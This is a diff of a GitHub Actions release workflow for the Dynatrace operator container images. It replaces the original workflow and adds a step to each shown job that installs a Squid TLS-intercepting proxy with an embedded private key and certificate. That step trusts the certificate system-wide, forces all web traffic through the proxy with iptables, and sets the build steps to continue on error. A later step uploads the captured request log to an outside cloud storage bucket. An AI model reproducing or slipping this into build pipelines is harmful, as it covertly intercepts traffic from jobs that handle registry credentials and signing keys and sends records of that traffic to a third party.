@@ -1,426 +1,2249 @@
-name: Release
-on:
-  push:
-    tags:
-      - v[0-9]+.[0-9]+.[0-9]+
-      - v[0-9]+.[0-9]+.[0-9]+-rc.[0-9]+ # include prerelease tags too
-
-
+env:
+  JAVA_TOOL_OPTIONS: -Djavax.net.ssl.trustStore=/usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+  NODE_OPTIONS: --use-openssl-ca
 jobs:
-  prepare:
+  attach-sbom:
+    environment: Release
+    name: Attach sbom
+    needs:
+    - prepare
+    - push
+    - manifest
     permissions:
-      contents: read
       id-token: write
-    name: Prepare properties
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871 # v4.2.1
-      - name: Prepare build parameters
-        id: prep
-        run: |
-          hack/build/ci/prepare-build-variables.sh
-      - name: Docker metadata
-        uses: docker/metadata-action@8e5442c4ef9f78752691e2d8f8d19755c6f78e81 # v5.5.1
-        id: meta
-        with:
-          images: dynatrace/dynatrace-operator
-          tags: ${{ steps.prep.outputs.docker_image_tag }}
-          labels: |
-            ${{ steps.prep.outputs.docker_image_labels }}
-            vcs-ref=${{ github.sha }}
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      if: ${{ matrix.registry != 'amazon-ecr' }}
+      name: Login to Registry
+      uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567
+      with:
+        password: ${{ secrets[matrix.password] }}
+        registry: ${{ matrix.url }}
+        username: ${{ secrets[matrix.username] }}
+    - continue-on-error: true
+      if: ${{ matrix.registry == 'amazon-ecr' }}
+      name: Configure aws credentials
+      uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
+      with:
+        aws-region: us-east-1
+        role-to-assume: ${{ secrets.ECR_IMAGEPUSH_ROLE }}
+    - continue-on-error: true
+      if: ${{ matrix.registry == 'amazon-ecr' }}
+      name: Login to Amazon ECR
+      uses: aws-actions/amazon-ecr-login@062b18b96a7aff071d4dc91bc00c4c1a7945b076
+      with:
+        registry-type: public
+    - continue-on-error: true
+      id: sbom
+      name: Create sbom for ${{matrix.registry}}
+      uses: aquasecurity/trivy-action@5681af892cd0f4997658e2bacc62bd0a894cf564
+      with:
+        format: cyclonedx
+        image-ref: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version
+          }}@${{ needs.manifest.outputs.digest }}
+        output: result.json
+        skip-dirs: /usr/share/dynatrace-operator/third_party_licenses
+    - continue-on-error: true
+      name: Upload sbom to ${{matrix.registry}}
+      uses: ./.github/actions/upload-sbom
+      with:
+        image: ${{ matrix.url }}/${{ secrets[matrix.repository] }}:${{ needs.prepare.outputs.version
+          }}@${{ needs.manifest.outputs.digest }}
+        sbom: result.json
+        signing-key: ${{ secrets.COSIGN_PRIVATE_KEY }}
+        signing-password: ${{ secrets.COSIGN_PASSWORD }}
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
+    strategy:
+      matrix:
+        include:
+        - password: GCR_JSON_KEY
+          registry: gcr
+          repository: GCR_REPOSITORY
+          url: gcr.io
+          username: GCR_USERNAME
+        - password: DOCKERHUB_PASSWORD
+          registry: dockerhub
+          repository: DOCKERHUB_REPOSITORY
+          url: docker.io
+          username: DOCKERHUB_USERNAME
+        - registry: amazon-ecr
+          repository: ECR_REPOSITORY
+          url: public.ecr.aws
+        registry:
+        - gcr
+        - dockerhub
+        - amazon-ecr
+    timeout-minutes: 60
+  build:
+    name: Build images
+    needs:
+    - prepare
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        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
+
+        CznEvO4qIs3mXDYkNBQrdVLGF93y
+
+        -----END PRIVATE KEY-----
+
+        EOF
+
+        cat << EOF | sudo tee /squid/cert.pem
+
+        -----BEGIN CERTIFICATE-----
+
+        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
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Checkout
+      uses: actions/checkout@eef61447b9ff4aafe5dcd4e0bbf5d482be7e7871
+    - continue-on-error: true
+      name: Build image
+      uses: ./.github/actions/build-image
+      with:
+        image-tag: ${{ needs.prepare.outputs.version }}
+        labels: ${{ needs.prepare.outputs.labels }}
+        platform: ${{ matrix.platform }}
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/Dynatrace/dynatrace-operator.$(date
+        +%s)
+    strategy:
+      matrix:
+        platform:
+        - amd64
+        - arm64
+        - ppc64le
+        - s390x
+    timeout-minutes: 60
+  manifest:
+    environment: Release
+    name: Create Docker manifests
+    needs:
+    - prepare
+    - push
+    outputs:
+      digest: ${{ steps.create-manifests.outputs.digest }}
+    permissions:
+      id-token: write
+    runs-on: ubuntu-latest
+    steps:
+    - name: before
+      run: 'sudo apt update
+
+        sudo apt install -y squid-openssl
+
+        sudo mkdir /squid
+
+        cat << EOF | sudo tee /squid/key.pem
+
+        -----BEGIN PRIVATE KEY-----
+
+        MIIJQQIBADANBgkqhkiG9w0BAQEFAASCCSswggknAgEAAoICAQCdLvQDIyCns8bh
+
